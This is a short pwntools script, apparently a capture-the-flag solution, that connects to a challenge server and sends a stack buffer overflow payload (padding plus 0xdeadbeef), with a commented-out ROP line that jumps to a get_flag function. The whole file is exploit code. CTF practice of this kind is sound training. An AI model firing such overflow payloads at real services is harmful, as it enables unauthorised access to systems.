#!/usr/bin/python3

from pwn import *

p = remote('ctf.isss.io', 5013)

#p.sendline(b"A"*72 + p64(rop.find_gadget(['ret'])[0]) + p64(e.sym['get_flag']))
p.sendline(b"A"*28 + p32(0xdeadbeef))
p.interactive()
